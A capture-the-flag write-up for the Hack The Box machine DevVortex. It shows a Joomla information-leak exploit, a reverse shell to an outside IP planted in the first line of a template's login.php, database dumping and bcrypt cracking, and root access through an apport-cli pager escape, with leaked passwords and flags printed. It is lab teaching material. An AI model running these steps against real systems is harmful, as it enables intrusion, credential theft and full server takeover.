# DevVortex

Let's check for subdomains !
```
gobuster vhost -u devvortex.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

For a reason I don't understand, my output says that there's no subdomain...
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://devvortex.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Progress: 4989 / 4990 (99.98%)
===============================================================
Finished
===============================================================
```

Let's try another tool like `Ffuf` ! 
```
ffuf -u http://devvortex.htb/ -H "Host:FUZZ.devvortex.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 154
```
> The `-fs 154` flag is for avoid errors

Finally, we have something interesting !
```

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://devvortex.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.devvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 90ms]
:: Progress: [114441/114441] :: Job [1/1] :: 1324 req/sec :: Duration: [0:01:24] :: Errors: 0 ::
```

We find a `dev` subdomain ! Let's added to the `/etc/hosts` file !
```
...
10.129.171.10   devvortex.htb   dev.devvortex.htb
```

Let's enumerate the `dev.devvortex.htb` !!
```
gobuster dir -u http://dev.devvortex.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

We find a `administrator` domain ! Let's dig in !

The technologie seems to be a `Joomla`, let's check it with `joomscan` !
```
joomsacn -u dev.devvortex.htb
```

The output gives the currect joomla version and more information !
```
[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 4.2.6

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://dev.devvortex.htb/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://dev.devvortex.htb/robots.txt

Interesting path found from robots.txt
http://dev.devvortex.htb/joomla/administrator/
http://dev.devvortex.htb/administrator/
http://dev.devvortex.htb/api/
http://dev.devvortex.htb/bin/
http://dev.devvortex.htb/cache/
http://dev.devvortex.htb/cli/
http://dev.devvortex.htb/components/
http://dev.devvortex.htb/includes/
http://dev.devvortex.htb/installation/
http://dev.devvortex.htb/language/
http://dev.devvortex.htb/layouts/
http://dev.devvortex.htb/libraries/
http://dev.devvortex.htb/logs/
http://dev.devvortex.htb/modules/
http://dev.devvortex.htb/plugins/
http://dev.devvortex.htb/tmp/
```

Let's check for Vulnerabilities of Joomla !

I found [this] one ! so let's use it !
```
ruby exploit.rb http://dev.devvortex.htb
```

The output is this one !
```
ruby exploit.rb http://dev.devvortex.htb
Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered

Site info
Site name: Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: false

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: P4ntherg0t1n5r3c0n##
DB name: joomla
DB prefix: sd4fg_
DB encryption 0

```

On modify le fichier ```login.php```, check the first line
```
<?php
system('bash -c "bash -i >& /dev/tcp/10.10.16.32/9000 0>&1"');

/**
 * @package     Joomla.Administrator
 * @subpackage  Templates.Atum
 * @copyright   (C) 2016 Open Source Matters, Inc. <https://www.joomla.org>
 * @license     GNU General Public License version 2 or later; see LICENSE.txt
 * @since       4.0.0
 */

defined('_JEXEC') or die;

use Joomla\CMS\Environment\Browser;
use Joomla\CMS\Factory;
use Joomla\CMS\HTML\HTMLHelper;
use Joomla\CMS\Language\Text;
use Joomla\CMS\Layout\LayoutHelper;
use Joomla\CMS\Uri\Uri;
```

Once inside, let's use this for having mysql rights

```
python3 -c "import pty;pty.spawn('/bin/bash')"
```


Once let's use this command for getting the all the users


```
mysql> SELECT * FROM sd4fg_users;
SELECT * FROM sd4fg_users;
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2023-12-02 17:42:25 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |
| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
2 rows in set (0.00 sec)
```

So with john we can hack the hash
```
john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt pass.txt
Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
Use the "--format=bcrypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tequieromucho    (?)
1g 0:00:00:07 DONE (2023-12-02 18:55) 0.1265g/s 182.2p/s 182.2c/s 182.2C/s lacoste..michel
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

That's means the `logan`'s credentials are
```
user: logan
pass: tequieromucho
```

Let's try connect with `ssh`  !
```
ssh logan@devvortex.htb
```
> Enter *tequieromucho* as password

Done ! So let's check for the ```user.txt``` flag
```
75601b525474a3c1f239dd5507e8b1da
```

Let's start the privilege scalation ! Let's check our privileges
```
sudo -l
```

We have this : `apport`!
```
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

Let's get the version of this tool
```
logan@devvortex:~$ sudo /usr/bin/apport-cli -v
2.20.11
```

Looking on internet for a exploit, there's a [exploit](https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb) ! let's exploit this !
```
sudo /usr/bin/apport-cli /var/crash/_usr_bin_sleep.1000.crash
```

We are supposed to have this output
```
*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (29.9 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I:  Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C):
```
> Following the exploit, let's enter the letter `V` !


The output will only show something like that
```
*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.
.......................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................
```

When the script is running, the two points will appear. 
```
== CasperMD5CheckResult =================================
skip

== CoreDump =================================
(binary data)

== Date =================================
Mon Dec  4 15:42:02 2023

== Dependencies =================================
gcc-10-base 10.5.0-1ubuntu1~20.04
libacl1 2.2.53-6
libattr1 1:2.4.48-5
libc6 2.31-0ubuntu9.12
libcrypt1 1:4.4.10-10ubuntu4
libgcc-s1 10.5.0-1ubuntu1~20.04
:
```

Instead of tapping on `q` (for quiting), tap `!/bin/bash` and then tap `enter`
```
...
Mon Dec  4 15:42:02 2023

== Dependencies =================================
gcc-10-base 10.5.0-1ubuntu1~20.04
libacl1 2.2.53-6
libattr1 1:2.4.48-5
libc6 2.31-0ubuntu9.12
libcrypt1 1:4.4.10-10ubuntu4
libgcc-s1 10.5.0-1ubuntu1~20.04
!/bin/bash
```

This will provide us the root acces ! this is will be the output
```
......................................................................................................................................................................................................................................................................................................ERROR: Cannot update tmp.crash: [Errno 13] Permission denied: 'tmp.crash'
...............
root@devvortex:#
```

Finally, we can juste see the flag !
```
cat /root/root.txt
```

We have the flag !
```
19d0b523f3e20fe52d70a836284ee15e
```

The machine is now pwned !
